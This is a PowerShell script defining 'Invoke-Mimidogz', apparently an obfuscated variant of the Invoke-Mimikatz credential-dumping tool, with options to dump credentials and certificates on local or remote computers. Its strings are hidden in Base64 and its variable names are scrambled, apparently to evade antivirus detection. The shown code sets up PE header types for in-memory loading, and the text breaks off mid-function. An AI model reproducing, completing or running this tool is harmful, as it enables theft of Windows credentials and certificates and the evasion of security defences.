function Invoke-Mimidogz
{
[CmdletBinding(DefaultParameterSetName="DumpCred")]
Param(
	[Parameter(Position = 0)]
	[String[]]
	$ComputerName,
    [Parameter(ParameterSetName = "DumpCred", Position = 1)]
    [Switch]
    $DumpCred,
    [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
    [Switch]
    $DumpCerts,
    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
    [String]
    $Command
)
Set-StrictMode -Version 2
${__/\/\/=\/\/\_/\/} = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		${/===\/=\__/===\__},
        [Parameter(Position = 1, Mandatory = $true)]
		[String]
		${__/\/\_/=\/\/\/==},
		[Parameter(Position = 2, Mandatory = $false)]
		[String]
		$FuncReturnType,
		[Parameter(Position = 3, Mandatory = $false)]
		[Int32]
		${/=\/\_/\____/==\/},
		[Parameter(Position = 4, Mandatory = $false)]
		[String]
		$ProcName,
        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        ${__/\___/\__/===\_/}
	)
	Function __/\_/==\__/\/==\/
	{
		$Win32Types = New-Object System.Object
		${__/\__/\_/\/=\/=\} = [AppDomain]::CurrentDomain
		${____/=\/===\___/=} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBBAHMAcwBlAG0AYgBsAHkA'))))
		${__/\/===\/\__/\/=} = ${__/\__/\_/\/=\/=\}.DefineDynamicAssembly(${____/=\/===\___/=}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		${_/\/\__/==\/\_/==} = ${__/\/===\/\__/\/=}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBNAG8AZAB1AGwAZQA='))), $false)
		${/=\/====\/=\_/=\/} = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
		${/===\/==\_/==\/\_} = ${_/\/\__/==\/\_/==}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUA'))), [UInt16] 0) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQAzADgANgA='))), [UInt16] 0x014c) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQB0AGEAbgBpAHUAbQA='))), [UInt16] 0x0200) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eAA2ADQA'))), [UInt16] 0x8664) | Out-Null
		${/===\__/==\/\/==\} = ${/===\/==\_/==\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value ${/===\__/==\/\/==\}
		${/===\/==\_/==\/\_} = ${_/\/\__/==\/\_/==}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAFQAeQBwAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIAMwAyAF8ATQBBAEcASQBDAA=='))), [UInt16] 0x10b) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIANgA0AF8ATQBBAEcASQBDAA=='))), [UInt16] 0x20b) | Out-Null
		${/====\/\_/=\/\__/} = ${/===\/==\_/==\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value ${/====\/\_/=\/\__/}
		${/===\/==\_/==\/\_} = ${_/\/\__/==\/\_/==}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAUwB5AHMAdABlAG0AVAB5AHAAZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBVAE4ASwBOAE8AVwBOAA=='))), [UInt16] 0) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBOAEEAVABJAFYARQA='))), [UInt16] 1) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8ARwBVAEkA'))), [UInt16] 2) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8AQwBVAEkA'))), [UInt16] 3) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBQAE8AUwBJAFgAXwBDAFUASQA='))), [UInt16] 7) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8AQwBFAF8ARwBVAEkA'))), [UInt16] 9) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAEEAUABQAEwASQBDAEEAVABJAE8ATgA='))), [UInt16] 10) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAEIATwBPAFQAXwBTAEUAUgBWAEkAQwBFAF8ARABSAEkAVgBFAFIA'))), [UInt16] 11) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAFIAVQBOAFQASQBNAEUAXwBEAFIASQBWAEUAUgA='))), [UInt16] 12) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAFIATwBNAA=='))), [UInt16] 13) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBYAEIATwBYAA=='))), [UInt16] 14) | Out-Null
		${/===\__/\/\/\/\/=} = ${/===\/==\_/==\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value ${/===\__/\/\/\/\/=}
		${/===\/==\_/==\/\_} = ${_/\/\__/==\/\_/==}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMAVAB5AHAAZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAwAA=='))), [UInt16] 0x0001) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAxAA=='))), [UInt16] 0x0002) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAyAA=='))), [UInt16] 0x0004) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAzAA=='))), [UInt16] 0x0008) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAEQAWQBOAEEATQBJAEMAXwBCAEEAUwBFAA=='))), [UInt16] 0x0040) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAEYATwBSAEMARQBfAEkATgBUAEUARwBSAEkAVABZAA=='))), [UInt16] 0x0080) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAE4AWABfAEMATwBNAFAAQQBUAA=='))), [UInt16] 0x0100) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBJAFMATwBMAEEAVABJAE8ATgA='))), [UInt16] 0x0200) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBTAEUASAA='))), [UInt16] 0x0400) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBCAEkATgBEAA=='))), [UInt16] 0x0800) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwA0AA=='))), [UInt16] 0x1000) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBXAEQATQBfAEQAUgBJAFYARQBSAA=='))), [UInt16] 0x2000) | Out-Null
		${/===\/==\_/==\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBUAEUAUgBNAEkATgBBAEwAXwBTAEUAUgBWAEUAUgBfAEEAVwBBAFIARQA='))), [UInt16] 0x8000) | Out-Null
		${_/\_/\___/\__/=\/} = ${/===\/==\_/==\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value ${_/\_/\___/\__/=\/}
		${_/=\_/===\_/\/=\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${/===\/==\_/==\/\_} = ${_/\/\__/==\/\_/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABBAFQAQQBfAEQASQBSAEUAQwBUAE8AUgBZAA=='))), ${_/=\_/===\_/\/=\/}, [System.ValueType], 8)
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		${/===\___/\_/\/===} = ${/===\/==\_/==\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value ${/===\___/\_/\/===}
		${_/=\_/===\_/\/=\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${/===\/==\_/==\/\_} = ${_/\/\__/==\/\_/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARgBJAEwARQBfAEgARQBBAEQARQBSAA=='))), ${_/=\_/===\_/\/=\/}, [System.ValueType], 20)
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFMAZQBjAHQAaQBvAG4AcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AG0AYgBvAGwAVABhAGIAbABlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFMAeQBtAGIAbwBsAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYATwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/=\__/=\/=\_/\/\} = ${/===\/==\_/==\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value ${_/=\__/=\/=\_/\/\}
		${_/=\_/===\_/\/=\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${/===\/==\_/==\/\_} = ${_/\/\__/==\/\_/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATwBQAFQASQBPAE4AQQBMAF8ASABFAEEARABFAFIANgA0AA=='))), ${_/=\_/===\_/\/=\/}, [System.ValueType], 240)
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAA=='))), ${/====\/\_/=\/\__/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(2) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(3) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBuAGkAdABpAGEAbABpAHoAZQBkAEQAYQB0AGEA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(8) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAVQBuAGkAbgBpAHQAaQBhAGwAaQB6AGUAZABEAGEAdABhAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(12) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARQBuAHQAcgB5AFAAbwBpAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(16) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(20) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAGEAZwBlAEIAYQBzAGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(24) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdABpAG8AbgBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(32) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(36) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(40) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(42) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(44) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(46) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(48) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(50) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAFYAZQByAHMAaQBvAG4AVgBhAGwAdQBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(52) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(56) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(60) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFMAdQBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(64) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAcwB5AHMAdABlAG0A'))), ${/===\__/\/\/\/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(68) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), ${_/\_/\___/\__/=\/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(70) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAFIAZQBzAGUAcgB2AGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(72) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAEMAbwBtAG0AaQB0AA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(80) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABSAGUAcwBlAHIAdgBlAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(88) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABDAG8AbQBtAGkAdAA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(96) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABlAHIARgBsAGEAZwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(104) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAdgBhAEEAbgBkAFMAaQB6AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(108) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbwByAHQAVABhAGIAbABlAA=='))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(112) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAVABhAGIAbABlAA=='))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(120) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwB1AHIAYwBlAFQAYQBiAGwAZQA='))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(128) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AVABhAGIAbABlAA=='))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(136) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBlAHIAdABpAGYAaQBjAGEAdABlAFQAYQBiAGwAZQA='))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(144) | Out-Null
		(${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBSAGUAbABvAGMAYQB0AGkAbwBuAFQAYQBiAGwAZQA='))), ${/===\___/\_/\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(152) | Out-Null
